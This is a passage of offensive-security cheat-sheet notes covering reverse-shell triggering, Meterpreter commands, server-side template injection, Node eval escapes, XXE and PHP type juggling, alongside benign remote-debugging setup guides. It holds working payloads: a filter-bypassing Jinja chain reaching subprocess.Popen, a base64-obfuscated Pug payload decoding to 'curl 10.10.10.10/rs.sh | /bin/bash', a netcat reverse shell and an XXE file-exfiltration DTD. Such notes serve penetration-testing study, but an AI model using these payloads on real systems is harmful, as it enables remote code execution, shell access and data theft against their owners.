Trigger execution via the command: `curl http://10.10.10.10/rs.sh | /bin/bash`

### Meterpreter useful commands

See [here](Meterpreter_cheat_sheet.pdf) for more details or commands.

```shell
# Provides information about target host
meterpreter> sysinfo
# Obtain the username responsible for the current process
meterpreter> getuid
# Displays network interfaces information
meterpreter> ipconfig
# Obtain current working directory on Server side
meterpreter> getwd
# Obtain local current working directory
meterpreter> getlwd
# Read the given file
meterpreter> cat <file>
# Upload a file to the target host
meterpreter> upload <src file> <dst file>
# Download a file from the target host
meterpreter> download <src file> <dst file>
```

## SSTI tips

The first step is to identify the syntax for the **Expression** and **Statement** for the targeted template engine in place. This [fuzzing dictionary](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-expression.txt) can help.

### Python with Jinja

**Statements** and **Expressions** combinations allowing execution of command and bypassing some filters that check for forbiden characters like "_":

```jinja
{# Define the character underscore without writing it statically #}
{% set marker = "%c" % 95 %}

{# Define an entry point object instance to search in the execution context #}
{% set string = "x" %}

{# Build the names of objects without using the underscore explicitly #}
{% set class = marker[0] + marker[0] + "class" + marker[0] + marker[0] %}
{% set mro = marker[0] + marker[0] + "mro" + marker[0] + marker[0] %}
{% set subclasses = marker[0] + marker[0] + "subclasses" + marker[0] + marker[0] %}

{# Access to the MRO of the entry point object instance and then loaded sub classes in the current execution context #}
{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}

{# Dynamically find the index of the class "subprocess.Popen" in the current execution context #}
{% set size = subclasses_r|length %}
{% set index = -1 %}
{% for i in range(size) %}
	{# value for "class_name" is like "<class 'subprocess.popen'>" #}
	{% set class_name = subclasses_r[loop.index]|string|lower|safe %}
	{# value for class_name_short is like "subprocess.popen" #}
	{% set class_name_short = class_name.split("'")[1] %}
	{# Check current class #}
	{% if class_name_short == "subprocess.popen" and index == -1 %}
		{% set index = loop.index %}
		{% set subclass = subclasses_r[index] %}
		CLASS:
		Index: {{ index }}
		Class: {{subclass|forceescape}}
		{# Value for PIPE was obtained by reading the source code of the class subprocess #}
		{% set pipe = -1 %}
		{# Trigger the execution of the wanted command #}
		{% set p = subclass (["/bin/wget", "10.10.10.10/rs.sh"], stdout=pipe, stderr=pipe) %}
		{# Access to the execution output #}
		EXEC STDOUT:
		{{ p.stdout.read() }}
		EXEC STDERR:
		{{ p.stderr.read() }}
	{% endif %}
{% endfor %}
```

### NodeJS via Express with Pug

Interesting objects to inspect via a template **Expression**:

```javascript
#{this}
#{Object.keys(this)}
#{Object.keys(global)}
#{Object.keys(process)}
```

**Expression** allowing execution of command and bypassing some filters:

```javascript
/*
cj1wcm9jZXNzLm1haW5Nb2R1bGUuY29uc3RydWN0b3IuX2xvYWQ7cigiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgMTAuMTAuMTAuMTAvcnMuc2ggfCAvYmluL2Jhc2giKTs=

Once Base64 decoded is

r=process.mainModule.constructor._load;r("child_process").exec("curl 10.10.10.10/rs.sh | /bin/bash");
*/
=eval(new Buffer("cj1wcm9jZXNzLm1haW5Nb2R1bGUuY29uc3RydWN0b3IuX2xvYWQ7cigiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgMTAuMTAuMTAuMTAvcnMuc2ggfCAvYmluL2Jhc2giKTs=",'base64').toString('ascii'))
```

### NodeJS when a feature use user provided code in the eval() function

**Code** allowing execution of command and bypassing some filters by defining a custom limited execution context. Here `[ExternalObjectReferencePassed]` refer to an object reference passed from the external context to the custom execution context created:

```javascript
(function test(){var p=[ExternalObjectReferencePassed].constructor.constructor('return process')();var require=p.mainModule.require;var cp=require('child_process'); var c='nc 10.10.10.10 9100 -e \\\\x2fbin\\\\x2fbash'; cp.exec(c); return 1;})()
```

## Debug a DotNet web app with DNSpy

Debug instruction:

```csharp
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```

Procedure:

1. Using DNSpy: Add the **debug instruction** to the target assembly in the app install directory and save the assembly module.
2. Remove the assembly from DNSpy
3. Restart IIS via `iisreset /noforce` to ensure that the assembly will be copied by the worker in its working folder.
4. Access the application home page in order to instruct IIS to initiate a worker.
5. Using DNSpy: Open the assembly file from the worker working folder.
6. Using DNSpy: Attach to the process *w3wp.exe* (IIS worker process) via *Debug > Attach to Process...* menu.
7. Using DNSpy: Pause (*Break All*) the debugging.
8. Using DNSpy: Open all module via *Debug > Windows > Modules* menu, right-click on a module and click on *Open All Modules*.
9. Using DNSpy: Choose a location and set a breakpoint.
10. Using DNSpy: Click on *Continue* to resume the debugging.
11. Access the application to trigger the breakpoint.

## Debug a Python web app with VSCode

### Step 1

Add the following code in the starting point of the application as first statement before the application start in order to start it allowing to attach a debugger to it:

:information_source: [PTVSD documentation](https://github.com/microsoft/ptvsd)

```python
###### Start the debugger on port 5678
## Dependency: pip install ptvsd
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger on port 5678")
ptvsd.wait_for_attach()
#########################################################################
```

Example in a Flask application:

```python
from flask import Flask, request

###### Start the debugger on port 5678
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger on port 5678")
ptvsd.wait_for_attach()
#########################################################################

app = Flask(__name__)

@app.route('/', methods=['GET'])
def call():
    print("[+] Call")
    return "OK"
	
app.run(host='0.0.0.0', port=8000)
```

### Step 2

In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

:warning: Adjust the **remoteRoot** attribute to the target deployment absolute folder path!

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Python Remote Attach To Debugger",
            "type": "python",
            "request": "attach",
            "connect": {
                "host": "10.10.10.10",
                "port": 5678
            },
            "pathMappings": [
                {
                    "localRoot": "${workspaceFolder}",
                    "remoteRoot": "."
                }
            ]
        }
    ]
}
```

### Step 3

1. Run the application on the server.
2. Launch the debug configuration in VSCode.
3. If all goes well, the debugger will be attached and breakpoint can be created/triggered.

:triangular_flag_on_post: If the error `Only one usage of each socket address (protocol/network address/port) is normally permitted` is raised during the start of the app then change the attach port via the following syntax:

```python
ptvsd.enable_attach(address=("10.10.10.10", 8200), redirect_output=True)
```

## Debug a NodeJS web app with VSCode

### Step 1

Start application in debug mode:

:information_source: [Command line options for the debug mode](https://nodejs.org/en/docs/guides/debugging-getting-started/#command-line-options)

```shell
$ node --inspect=10.10.10.10:9229 app.js
Debugger listening on ws://10.10.10.10:9229/dbc78b68-7d9d-46e6-b501-b3110dd6c04d
For help, see: https://nodejs.org/en/docs/inspector
```

### Step 2

:information_source: [Remote debugging configuration options](https://code.visualstudio.com/docs/nodejs/nodejs-debugging#_remote-debugging)

:information_source: Notes about the `localRoot` and `remoteRoot` configuration options taken from the link above:

> By default, VSCode will stream the debugged source from the remote Node.js folder to the local VSCode and show it in a **read-only** editor.

> You can step through this code, but cannot modify it. If you want VSCode to open the editable source from your workspace instead, you can setup a mapping between the remote and local locations. 

> A `localRoot` and a `remoteRoot` attribute can be used to map paths between a local VSCode project and a (remote) Node.js folder. This works even locally on the same system or across different operating systems. Whenever a code path needs to be converted from the remote Node.js folder to a local VS Code path, the `remoteRoot` path is stripped off the path and replaced by `localRoot`. For the reverse conversion, the `localRoot` path is replaced by the `remoteRoot`.

Use the `"localRoot": "${workspaceFolder}"` option to point local sources to the workspace location.

In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "address": "10.10.10.10",
            "name": "NodeJS Remote Attach To Debugger",
            "port": 9229,
            "request": "attach",
            "skipFiles": [
                "<node_internals>/**"
            ],
            "type": "pwa-node"
        }
    ]
}
```

### Step 3

1. Launch the debug configuration in VSCode.
2. If all goes well, the debugger will be attached and breakpoint can be created/triggered.

## Debug a PHP web app with VSCode

### Step 1

:information_source: [XDebug documentation](https://xdebug.org/docs/install) 

:triangular_flag_on_post: In this debug mode, it's XDebug that will connect back to the debug listener started by VSCode when a PHP remote script is called.

:warning: Ensure that the following lines are present into the `php.ini` configuration file used by the server in order to ensure that XDebug is installed/configured:

```ini
; ...
zend_extension = [FULL_PATH_TO_THE_XDEBUG_LIBRARY_SO_OR_DLL_FILE]
; ...
[XDebug]
xdebug.remote_enable = true
xdebug.remote_autostart = true
xdebug.remote_connect_back = true
xdebug.remote_port = 8000
```

### Step 2

:warning: Adjust the `[REMOTE_ROOT]` marker to the target deployment absolute folder path!

:warning: Ensure that the server can connect to the IP/PORT specified in the `php.ini` file as well as the VSCode debug configuration!

1. Install the VSCode extension *[PHP Debug](https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-debug)*.
2. In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Listen for XDebug incoming connection",
            "type": "php",
            "request": "launch",
            "hostname": "10.10.10.10",
            "port": 8000,
            "log": true,
            "pathMappings": {
                "[REMOTE_ROOT]": "${workspaceRoot}"
              }
        }
    ]
}
``` 

### Step 3

1. Launch the debug configuration in VSCode.
2. Set a breakpoint.
3. Call the remote PHP script via the browser or a HTTP client.
4. If all goes well, the  breakpoint will be triggered.

## XML entities types and XXE payloads

### Internal entities

> Internal entities are locally defined within the DTD.

Format:

```xml
<!ENTITY name "value">
```

Example:

```xml
<!ENTITY xxe "<test>xxe</test>">
```

### External entities

> External entities are defined outside the DTD.

#### Private

> Private external entities (indicated by the **SYSTEM** keyword) are targeted to be used by a defined/restricted group of users.

Format:

```xml
<!ENTITY name SYSTEM "URI">
```

Example:

```xml
<!ENTITY xxe SYSTEM "http://mysite.com/xxe.xml">
```

#### Public

> Public external entities (indicated by the **PUBLIC** keyword) are targeted to be used by everyone (no defined audience).

Format:

```xml
<!ENTITY name PUBLIC "public_id" "URI">
```

Example:

```xml
<!ENTITY xxe PUBLIC "-//W3C//TEXT info//EN" "http://mysite.com/xxe.xml">
```

### Parameter entities

> Parameter entities exist only within a DTD. 

> Note the usage of the `%` character.

Format:

```xml
<!ENTITY % name SYSTEM "URI or VALUE">
```

Example:

```xml
<!ENTITY % parameterEntity 'TEST'>
<!ENTITY xxe 'Payload is %parameterEntity;'>
```

### Unparsed external entities

> XML entity are not required to contain valid XML code but, by default, the XML processor will try to process the referenced data.

> To prevent the XML processor the process the referenced data then the `NDATA` clause must be specified.

Format: Note the specification of the `NDATA TYPE` clause.

```xml
<!-- Private external entity -->
<!ENTITY name SYSTEM "URI" NDATA TYPE>
<!-- Public external entity -->
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
```

### Exfiltrate XML content via XXE

XXE main payload:

```xml
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file://[FILE_FULL_PATH]">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://10.10.10.10/wrapper.dtd">
%xxe;
]>
```

File *wrapper.dtd*:

```xml
<!ENTITY wrapper "%start;%file;%end;">
```

## PHP Type Juggling

**String conversion to numbers rules:**

> When a string is evaluated in a numeric context, the resulting value and type are determined as follows.

> If the string does not contain any of the characters `.`, `e`, or `E` and the numeric value fits into integer type limits (as defined by PHP_INT_MAX), the string will be evaluated as an int. In all other cases it will be evaluated as a float.

> The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero). Valid numeric data is an optional sign, followed by one or more digits (optionally containing a decimal point), followed by an optional exponent. The exponent is an 'e' or 'E' followed by one or more digits.

[Explanation 1](PHP_type_juggling.pdf)

[Explanation 2](https://www.copterlabs.com/strict-vs-loose-comparisons-in-php/)

[Documentation](http://php.net/manual/en/language.types.string.php#language.types.string.conversion)

[Magic hashes](https://github.com/spaze/hashes)

Example:

```php
//PHP 7.3.4 (cli)
//All expressions below returns true because the PHP engine convert
//the left string provided expression to a integer with the value 0
var_dump('0'==0); //bool(true)
var_dump('0xxxxx'==0);//bool(true)
var_dump('0e123'==0);//bool(true)
var_dump('0eABCD'==0);//bool(true)
var_dump('000e123'==0);//bool(true)
var_dump('000eABCD'==0);//bool(true)
var_dump('000E123'==0);//bool(true)
var_dump('000EABCD'==0);//bool(true)

//All expressions below returns true because the PHP engine convert
//the left string provided expression to a integer with the value 10
var_dump('010'==10);//bool(true)
var_dump('010xxx'==10);//bool(true)
```